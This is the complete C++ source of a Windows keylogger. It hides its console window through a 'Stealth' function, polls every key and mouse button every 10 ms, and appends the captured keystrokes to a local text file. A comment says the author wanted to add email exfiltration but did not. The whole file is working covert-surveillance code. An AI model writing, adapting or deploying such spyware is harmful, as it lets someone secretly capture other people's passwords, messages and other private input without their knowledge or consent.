#include <stdio.h>
#include <windows.h>
#include <string>
#include <iostream>
using namespace std;

#define KEY_PRESSED -32767

//***I was going to add an email functionality to this but could not figure out how to do it without a library that I would have to pay money for***

//Creates a file to write the logged keys into
FILE * file;

//Creates the stealth function as a method
void Stealth();

int main(int arg, char* argv[]) {
	char key;
	int index;
	int length;
	char* buffer;

	//Runs the stealth function
	Stealth();

	//Opens the file created to be able to input characters into
	file = fopen("LoggedText.txt", "a+");

	//Once the file is opened by the program this infinite loop starts and updates every 10ms 
	if (file != NULL) {
		while (true) {
			Sleep(10);
			for (key = 8; key <= 255; key++) {
				file = fopen("LoggedText.txt", "a+");
				if (GetAsyncKeyState(key) == KEY_PRESSED)
				{
					//Switch statement to account for all keys that can be logged as a character and keys that cannot be like spaces and returns
					switch (key) {
					case VK_SPACE:
						fprintf(file, " ");
						break;
					case VK_SHIFT:
						fprintf(file, "\n[SHIFT]\n");
						break;
					case VK_RETURN:
						fprintf(file, "\n[ENTER]\n");
						break;
					case VK_BACK:
						fprintf(file, "\n[BACKSPACE]\n");
						break;
					case VK_CAPITAL:
						fprintf(file, "\n[CAPSLOCK]\n");
						break;
					case VK_RBUTTON:
						fprintf(file, "\n[RBUTTON]\n");
						break;
					case VK_LBUTTON:
						fprintf(file, "\n[LBUTTON]\n");
						break;
					case 188:
						fprintf(file, ",");
						break;
					case 190:
						fprintf(file, ".");
						break;
					default:
						fprintf(file, "%c", key);
						break;
					}
				}
				fclose(file);
			}
		}
		file = fopen("LoggedText.txt", "rb");
		fseek(file, 0, SEEK_END);
		length = ftell(file);

		if (length >= 60) {
			fseek(file, 0, SEEK_SET);
			buffer = (char*)malloc(length);
			index = fread(buffer, 1, length, file);
			buffer[index] = '\0';
			fclose(file);
			file = fopen("LoggedText.txt", "w");
		}
		fclose(file);
	}
	return 0;
}

//Hides the console window on startup
void Stealth() {
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);
}



